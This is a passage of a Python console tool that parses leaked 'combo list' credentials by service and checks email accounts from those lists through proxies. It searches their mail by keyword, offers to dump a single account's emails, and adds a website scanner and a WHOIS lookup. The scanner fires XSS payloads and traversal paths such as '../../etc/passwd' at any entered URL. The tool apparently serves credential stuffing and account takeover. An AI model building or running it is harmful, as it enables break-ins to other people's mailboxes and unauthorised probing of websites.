                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            self.log_message(f"Error processing future: {str(e)}", "error")
                            self.error_count += 1
                            self.update_counts()

            except FileNotFoundError:
                self.log_message(f"File not found: {arquivo}", "error")
                self.error_count += 1
                self.update_counts()
            except Exception as e:
                self.log_message(f"Error reading file: {e}", "error")
                self.error_count += 1
                self.update_counts()
                with self.file_lock:
                    try:
                        with open(self.errorlog, "a", encoding="utf-8") as file:
                            file.write(f"File error: {str(e)}\n")
                    except PermissionError as e:
                        self.log_message(f"Permission denied writing to {self.errorlog}: {str(e)}", "error")
                        self.error_count += 1
                        self.update_counts()
            finally:
                self.running = False
                self.paused = False
                self.current_email = "None"
                self.current_proxy = "None"
                self.log_message("Checking complete.", "info")
                self.update_counts()

        threading.Thread(target=run_checking, daemon=True).start()

def clean_url(url):
    """Sanitize URL by removing invalid characters."""
    try:
        url = re.sub(r'\[__[ N U S A \- C L O U D ]__.*?($|\s)', '', url)
        url = re.sub(r'\[.*?]', '', url)
        url = url.strip()
        if not url:
            return None
        return url
    except re.error as e:
        logging.error(f"Regex error in clean_url: {e}")
        return url
    except Exception as e:
        logging.error(f"Error cleaning URL {url}: {e}")
        return None

def get_service_name(url):
    try:
        url = clean_url(url)
        if not url:
            return 'unknown'
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed_url = urlparse(url)
        domain = parsed_url.netloc.lower()
        if not domain or domain in ('www', 'login', 'accounts', 'signup', 'm', 'fr', 'frfr', 'ptbr', 'my'):
            return 'unknown'
        if domain.startswith('www.'):
            domain = domain[4:]
        parts = domain.split('.')
        if len(parts) > 2:
            return parts[-2]  # e.g., 'google' from 'accounts.google.com'
        elif len(parts) > 1:
            return parts[0]  # e.g., 'netflix' from 'netflix.com'
        return domain if domain else 'unknown'
    except Exception as e:
        logging.error(f"Error parsing URL {url}: {e}")
        return 'unknown'

def sanitize_filename(service):
    """Ensure service name is a valid filename with only alphanumeric characters."""
    if not service or len(service) < 2 or service in 'abcdefghijklmnopqrstuvwxyz1234567890' or service in ('www', 'login', 'accounts', 'signup', 'm', 'fr', 'frfr', 'ptbr', 'my'):
        return 'unknown'
    # Keep only alphanumeric characters
    service = re.sub(r'[^a-zA-Z0-9]', '', service)
    return service if service and service.strip() else 'unknown'

def parse_and_save_credentials(data, console=False):
    if not data:
        logging.error("No data provided.")
        print("Error: No data provided.")
        return False

    # Timestamp for directory and file names
    timestamp = time.strftime("%Y%m%d_%H%M")

    # Create a timestamped directory inside credential_files
    output_base_dir = os.path.abspath(os.path.normpath('credential_files'))
    output_dir = os.path.join(output_base_dir, timestamp)
    try:
        logging.debug(f"Attempting to create directory: {output_dir}")
        os.makedirs(output_dir, exist_ok=True)
        # Verify write permissions
        test_file = os.path.join(output_dir, '.test_write')
        with open(test_file, 'w', encoding='utf-8') as f:
            f.write('')
        os.remove(test_file)
        logging.info(f"Directory created or exists with write permissions: {output_dir}")
    except Exception as e:
        logging.error(f"Failed to create or write to directory {output_dir}: {e}")
        print(f"Error: Failed to create or write to directory {output_dir}: {e}")
        return False

    # Dictionary to track the count of each website for handling duplicates
    website_count = {}
    lines = data.strip().split('\n')
    total_lines = len(lines)
    processed_lines = 0
    parsed_count = 0
    unknown_count = 0

    # Fallback file for all parsed data
    fallback_file = os.path.join(output_base_dir, 'parsed_data_all.txt')
    try:
        with open(fallback_file, 'a', encoding='utf-8') as f:
            f.write(f"--- Parsing Session {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
    except Exception as e:
        logging.error(f"Failed to initialize fallback file {fallback_file}: {e}")

    if console:
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear console
        print(BANNER)

    for line in lines:
        line = line.strip()
        if not line:
            logging.debug(f"Skipping empty line")
            processed_lines += 1
            unknown_count += 1
            continue

        # Primary format: URL username:password or URL email:password
        match = re.match(r'^(https?://)?([a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]\.[a-zA-Z]{2,}|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\S*)?)(?:\s+|\s*)([^\s:;]+)[:;](.+)$', line)
        parsed_info = None
        if match:
            _, url, username, password = match.groups()
            credential = f"{username}:{password}"
            service = get_service_name(url)
            service = sanitize_filename(service)
            parsed_count += 1
            parsed_info = f"Parsed line: URL={url}, Credential={credential}, Service={service}"
            logging.debug(parsed_info)
        else:
            # Fallback: Check if credential part contains a URL
            match_fallback = re.match(r'^(\S+?)(?:\s+|\s*)((?:https?://)?[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]\.[a-zA-Z]{2,}|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\S*)?)[:;](.+)$', line)
            if match_fallback:
                _, url, password = match_fallback.groups()
                username = url.split('/')[-1].split(':')[0]
                credential = f"{username}:{password}"
                service = get_service_name(url)
                service = sanitize_filename(service)
                parsed_count += 1
                parsed_info = f"Parsed fallback: URL={url}, Credential={credential}, Service={service}"
                logging.debug(parsed_info)
            else:
                logging.warning(f"Skipping invalid line: {line}")
                unknown_count += 1

        # Save parsed data to individual file
        if parsed_info:
            # Increment the count for this website
            if service in website_count:
                website_count[service] += 1
            else:
                website_count[service] = 1

            # Determine the file name with timestamp
            if website_count[service] == 1:
                file_name = f"{service}_{timestamp}.txt"
            else:
                file_name = f"{service}_{timestamp}_{website_count[service]}.txt"

            # Write the line to a new file in the timestamp directory
            parsed_file = os.path.join(output_dir, file_name)
            try:
                with open(parsed_file, 'w', encoding='utf-8') as f:
                    f.write(parsed_info + '\n')
                    f.flush()
                    os.fsync(f.fileno())  # Ensure data is written to disk
                # Verify file exists and has content
                if os.path.exists(parsed_file):
                    file_size = os.path.getsize(parsed_file)
                    logging.debug(f"Parsed data file {parsed_file} created, size: {file_size} bytes")
                    if file_size == 0:
                        logging.warning(f"Parsed data file {parsed_file} is empty")
                else:
                    logging.error(f"Parsed data file {parsed_file} was not created")
                try:
                    os.chmod(parsed_file, 0o600)
                    logging.debug(f"Set permissions to 600 for {parsed_file}")
                except OSError as e:
                    logging.warning(f"Could not set permissions for {parsed_file}: {e}")
                logging.info(f"Saved parsed data to {parsed_file}")
                # Append to fallback file
                try:
                    with open(fallback_file, 'a', encoding='utf-8') as f:
                        f.write(parsed_info + '\n')
                        f.flush()
                        os.fsync(f.fileno())
                except Exception as e:
                    logging.error(f"Failed to append to fallback file {fallback_file}: {e}")
            except Exception as e:
                logging.error(f"Failed to write parsed data to {parsed_file}: {e}")
                print(f"Error: Failed to write parsed data to {parsed_file}: {e}")
                # Try appending to fallback file
                try:
                    with open(fallback_file, 'a', encoding='utf-8') as f:
                        f.write(f"Failed to write: {parsed_info} (Error: {e})\n")
                        f.flush()
                        os.fsync(f.fileno())
                except Exception as fb_e:
                    logging.error(f"Failed to append error to fallback file {fallback_file}: {fb_e}")
                return False

        processed_lines += 1

    if console:
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear console
        print(BANNER)

    if parsed_count == 0:
        logging.warning("No credentials parsed; no files written")
        print(f"No valid credentials found.\nParsed: {parsed_count} Unknown: {unknown_count}")
        return False

    print(f"Parsed data saved to '{output_dir}' folder.\nParsed: {parsed_count} Unknown: {unknown_count}")
    return True

def scan_website_vulnerabilities(url, output_dir, timestamp):
    """Perform advanced vulnerability scans on the given website URL."""
    if not url:
        logging.error("No URL provided for vulnerability scanning.")
        print("Error: No URL provided.")
        return False

    # Ensure URL has a scheme
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    # Parse and validate URL
    try:
        parsed_url = urlparse(url)
        if not parsed_url.netloc:
            logging.error(f"Invalid URL: {url}")
            print(f"Error: Invalid URL: {url}")
            return False
    except Exception as e:
        logging.error(f"Error parsing URL {url}: {e}")
        print(f"Error: Invalid URL: {e}")
        return False

    # Initialize results
    vulnerabilities = []
    logging.info(f"Starting vulnerability scan for {url}")

    # 1. Check for Insecure HTTP Headers
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers

        # Check for missing security headers
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'Content-Security-Policy': None,  # Presence is enough
            'Strict-Transport-Security': None,  # Presence for HTTPS
            'X-XSS-Protection': '1; mode=block'
        }

        for header, expected in security_headers.items():
            if header not in headers:
                vulnerabilities.append(f"[Insecure Headers] Missing {header}")
                logging.warning(f"Missing security header: {header}")
            elif expected and isinstance(expected, list) and headers[header] not in expected:
                vulnerabilities.append(f"[Insecure Headers] Incorrect {header}: {headers[header]} (Expected one of {expected})")
                logging.warning(f"Incorrect {header}: {headers[header]}")
            elif expected and headers[header] != expected:
                vulnerabilities.append(f"[Insecure Headers] Incorrect {header}: {headers[header]} (Expected {expected})")
                logging.warning(f"Incorrect {header}: {headers[header]}")

        # Check for insecure cookies
        for cookie in response.cookies:
            if not cookie.secure and parsed_url.scheme == 'https':
                vulnerabilities.append(f"[Insecure Cookies] Cookie {cookie.name} is not marked Secure")
                logging.warning(f"Insecure cookie: {cookie.name}")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                vulnerabilities.append(f"[Insecure Cookies] Cookie {cookie.name} is not marked HttpOnly")
                logging.warning(f"Cookie {cookie.name} lacks HttpOnly")

    except RequestException as e:
        vulnerabilities.append(f"[Connection Error] Failed to connect to {url}: {str(e)}")
        logging.error(f"Connection error during header check: {e}")
        return False

    # 2. Test for Reflected XSS
    xss_payloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "'><img src=x onerror=alert('xss')>"
    ]
    try:
        for payload in xss_payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?test={encoded_payload}" if '?' not in url else f"{url}&test={encoded_payload}"
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                vulnerabilities.append(f"[XSS] Reflected XSS vulnerability found with payload: {payload}")
                logging.warning(f"Potential XSS found with payload: {payload}")
    except RequestException as e:
        logging.warning(f"Error testing XSS: {e}")

    # 3. Check for CSRF Token Absence in Forms (using Selenium)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    driver = None
    try:
        driver = webdriver.Chrome(service=webdriver.chrome.service.Service(ChromeDriverManager().install()), options=chrome_options)
        driver.set_page_load_timeout(30)
        driver.get(url)
        time.sleep(2)

        forms = driver.find_elements(By.TAG_NAME, "form")
        for i, form in enumerate(forms):
            inputs = form.find_elements(By.CSS_SELECTOR, "input[name*='csrf'], input[name*='token']")
            if not inputs:
                vulnerabilities.append(f"[CSRF] Form #{i+1} lacks CSRF token")
                logging.warning(f"Form #{i+1} lacks CSRF token")
    except Exception as e:
        logging.warning(f"Error checking CSRF tokens: {e}")
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

    # 4. Test for Directory Traversal
    traversal_payloads = [
        "../../etc/passwd",
        "../../windows/win.ini",
        "../config.php"
    ]
    try:
        for payload in traversal_payloads:
            test_url = f"{url}/{payload}" if url.endswith('/') else f"{url}/{payload}"
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ['root:', '[extensions]', '<?php']):
                vulnerabilities.append(f"[Directory Traversal] Potential vulnerability with path: {payload}")
                logging.warning(f"Potential directory traversal with: {payload}")
    except RequestException as e:
        logging.warning(f"Error testing directory traversal: {e}")

    # Save results
    output_base_dir = os.path.abspath(os.path.normpath('credential_files'))
    output_dir = os.path.join(output_base_dir, timestamp)
    os.makedirs(output_dir, exist_ok=True)
    service = sanitize_filename(get_service_name(url))
    output_file = os.path.join(output_dir, f"vuln_scan_{service}_{timestamp}.txt")

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"Vulnerability Scan Report for {url}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n")
            if vulnerabilities:
                f.write(f"Found {len(vulnerabilities)} potential vulnerabilities:\n")
                for vuln in vulnerabilities:
                    f.write(f"{vuln}\n")
            else:
                f.write("No vulnerabilities found.\n")
            f.flush()
            os.fsync(f.fileno())
        logging.info(f"Vulnerability scan results saved to {output_file}")
        print(f"Scan complete. Results saved to {output_file}")
        print(f"Found {len(vulnerabilities)} potential vulnerabilities.")
    except Exception as e:
        logging.error(f"Failed to write scan results to {output_file}: {e}")
        print(f"Error: Failed to save scan results: {e}")
        return False

    return True

def run_osint_scan(email, output_dir, timestamp):
    """Perform OSINT gathering on the given email address using WHOIS for its domain."""
    if not email:
        logging.error("No email provided for OSINT scanning.")
        print("Error: No email provided.")
        return False

    # Validate email format
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_pattern, email):
        logging.error(f"Invalid email format: {email}")
        print(f"Error: Invalid email format: {email}")
        return False

    # Extract domain from email
    try:
        domain = email.lower().split('@')[1]
        if not domain:
            logging.error(f"Could not extract domain from email: {email}")
            print(f"Error: Could not extract domain from email: {email}")
            return False
    except Exception as e:
        logging.error(f"Error parsing email {email}: {e}")
        print(f"Error: Invalid email: {e}")
        return False

    # Initialize results
    osint_results = []
    logging.info(f"Starting OSINT scan for email {email} (domain: {domain})")

    # WHOIS Lookup on the email's domain
    try:
        w = whois.query(domain)
        if w:
            whois_info = (
                f"[WHOIS] Email: {email}\n"
                f"Domain: {w.name or 'N/A'}\n"
                f"Registrar: {w.registrar or 'N/A'}\n"
                f"Creation Date: {w.creation_date or 'N/A'}\n"
                f"Expiration Date: {w.expiration_date or 'N/A'}\n"
                f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'None'}\n"
                f"Registrant: {w.registrant or 'N/A'}"
            )
            osint_results.append(whois_info)
            logging.info(f"WHOIS lookup completed for domain {domain}")
        else:
            osint_results.append(f"[WHOIS] No WHOIS data found for domain {domain}")
            logging.warning(f"No WHOIS data found for {domain}")
    except Exception as e:
        osint_results.append(f"[WHOIS] Error for domain {domain}: {str(e)}")
        logging.warning(f"WHOIS lookup failed for {domain}: {e}")

    # Save results
    output_base_dir = os.path.abspath(os.path.normpath('credential_files'))
    output_dir = os.path.join(output_base_dir, timestamp)
    os.makedirs(output_dir, exist_ok=True)
    # Sanitize email for filename (replace @ and . with _)
    service = sanitize_filename(re.sub(r'[@.]', '_', email))
    output_file = os.path.join(output_dir, f"osint_scan_{service}_{timestamp}.txt")

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"OSINT Scan Report for Email {email}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n")
            if osint_results:
                for result in osint_results:
                    f.write(f"{result}\n")
            else:
                f.write("No OSINT data found.\n")
            f.flush()
            os.fsync(f.fileno())
        logging.info(f"OSINT scan results saved to {output_file}")
        print(f"OSINT scan complete. Results saved to {output_file}")
        print(f"Found {len(osint_results)} OSINT data points.")
    except Exception as e:
        logging.error(f"Failed to write OSINT scan results to {output_file}: {e}")
        print(f"Error: Failed to save OSINT scan results: {e}")
        return False

    return True

def run_email_checker(app, data=None, file_path=None):
    print("Email Keyword Checker")
    print("--------------------")

    # Get combo file or use provided data
    arquivo = file_path
    if not arquivo:
        if data:
            # Write pasted data to a temporary file
            temp_file = "temp_combo_list.txt"
            try:
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(data)
                arquivo = temp_file
            except Exception as e:
                app.log_message(f"Error writing temporary file: {str(e)}", "error")
                print(f"Error writing temporary file: {e}")
                return
        else:
            arquivo = app.browse_file()
            if not arquivo:
                return

    # Get proxy settings
    app.proxy_type_var = app.get_proxy_type()
    if app.proxy_type_var != "None":
        app.browse_proxies()

    # Get keyword
    keyword = input("Enter keyword to search in email subjects (or press Enter to disable keyword search): ").strip()
    app.disable_keyword = not bool(keyword)

    # Start checking
    app.start_checking(arquivo, keyword, app.disable_keyword)

    # Allow dumping single account after main checking
    while True:
        choice = input("\nDo you want to dump emails for a single account? (y/n): ").strip().lower()
        if choice == 'n':
            break
        if choice == 'y':
            input_str = input("Enter email:pass for dumping: ").strip()
            app.dump_single_account(input_str)
            time.sleep(5)  # Wait for dump to complete
        else:
            print("Invalid choice. Please enter 'y' or 'n'.")

    # Clean up temporary file if created
    if data and os.path.exists(temp_file):
        try:
            os.remove(temp_file)
            logging.debug(f"Temporary file {temp_file} removed")
        except Exception as e:
            logging.error(f"Error removing temporary file {temp_file}: {e}")

def console_mode():
    app = EmailCheckerApp()
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear console
        print(BANNER)
        print("\n1. Upload file")
        print("2. Paste data")
        print("3. Exit")
        print("4. Email Checker")
        print("5. Website Vulnerability Scanner")
        print("6. Email OSINT Tool")
        try:
            choice = input("Enter choice (1-6): ").strip()
        except KeyboardInterrupt:
            print("\nExiting...")
            break

        if choice == '1':
            input_file = app.get_file_input("Enter the full file path (e.g., C:\\Users\\YourName\\test.txt): ")
            if not input_file:
                print("No file path provided.")
                continue
            try:
                if not os.path.exists(input_file):
                    print(f"File not found: {input_file}")
                    logging.error(f"File not found: {input_file}")
                    continue
                logging.debug(f"Reading file: {input_file}")
                with open(input_file, 'r', encoding='utf-8') as f:
                    data = f.read()
            except Exception as e:
                logging.error(f"Error reading file {input_file}: {e}")
                print(f"Error reading file: {e}")
                continue

            while True:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(BANNER)
                print("\nFile Options:")
                print("1. Parse credentials")
                print("2. Email checker")
                print("3. Back")
                try:
                    sub_choice = input("Enter choice (1-3): ").strip()
                except KeyboardInterrupt:
                    print("\nReturning to main menu...")
                    break

                if sub_choice == '1':
                    parse_and_save_credentials(data, console=True)
                elif sub_choice == '2':
                    run_email_checker(app, file_path=input_file)
                elif sub_choice == '3':
                    break
                else:
                    print("Invalid choice. Please enter 1, 2, or 3.")

        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)
            print("\nPaste your data below (type 'END' on a new line to finish):")
            lines = []
            while True:
                try:
                    line = input()
                    if line.strip().upper() == 'END':
                        break
                    lines.append(line)
                except EOFError:
                    break
                except KeyboardInterrupt:
                    break
            data = '\n'.join(lines)
            if not data.strip():
                print("No data provided.")
                continue

            while True:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(BANNER)
                print("\nPaste Data Options:")
                print("1. Parse credentials")
                print("2. Email checker")
                print("3. Back")
                try:
                    sub_choice = input("Enter choice (1-3): ").strip()
                except KeyboardInterrupt:
                    print("\nReturning to main menu...")
                    break

                if sub_choice == '1':
                    parse_and_save_credentials(data, console=True)
                elif sub_choice == '2':
                    run_email_checker(app, data=data)
                elif sub_choice == '3':
                    break
                else:
                    print("Invalid choice. Please enter 1, 2, or 3.")

        elif choice == '3':
            print("Exiting...")
            break

        elif choice == '4':
            input_file = app.get_file_input("Enter the full file path (e.g., C:\\Users\\YourName\\combo.txt): ")
            if not input_file:
                print("No file path provided.")
                continue
            try:
                if not os.path.exists(input_file):
                    print(f"File not found: {input_file}")
                    logging.error(f"File not found: {input_file}")
                    continue
                run_email_checker(app, file_path=input_file)
            except Exception as e:
                logging.error(f"Error reading file {input_file}: {e}")
                print(f"Error reading file: {e}")
                continue

        elif choice == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)
            print("\nWebsite Vulnerability Scanner")
            url = input("Enter the website URL to scan (e.g., https://example.com): ").strip()
            timestamp = time.strftime("%Y%m%d_%H%M")
            scan_website_vulnerabilities(url, 'credential_files', timestamp)
            input("\nPress Enter to return to main menu...")

        elif choice == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)
            print("\nEmail OSINT Tool")
            email = input("Enter the email address to scan (e.g., user@example.com): ").strip()
            timestamp = time.strftime("%Y%m%d_%H%M")
            run_osint_scan(email, 'credential_files', timestamp)
            input("\nPress Enter to return to main menu...")

        else:
            print("Invalid choice. Please enter 1, 2, 3, 4, 5, or 6.")

def main():
    interrupted = False
    print(f"Starting credential parser and email checker...")
    print(f"Python version: {sys.version}")
    print(f"OS: {platform.system()} {platform.release()}")
    print(f"Working directory: {os.getcwd()}")

    try:
        test_file = 'credential_parser.log'
        with open(test_file, 'a', encoding='utf-8') as f:
            f.write('')
        logging.info("Write permissions confirmed.")
    except Exception as e:
        logging.error(f"No write permissions for {test_file}: {e}")
        print(f"Error: No write permissions for {test_file}: {e}")
        print("Move the script to a writable folder (e.g., C:\\Users\\YourName\\Desktop).")
        return

    try:
        console_mode()
    except Exception as e:
        logging.error(f"Script failed: {e}")
        print(f"Script failed: {e}")
        print("Check 'credential_parser.log' for details.")
    except KeyboardInterrupt:
        print("\nExiting...")
        interrupted = True
    finally:
        if not interrupted and sys.stdout.isatty():
            print("Press Enter to exit...")
            try:
                input()
            except EOFError:
                pass

if __name__ == "__main__":
    main()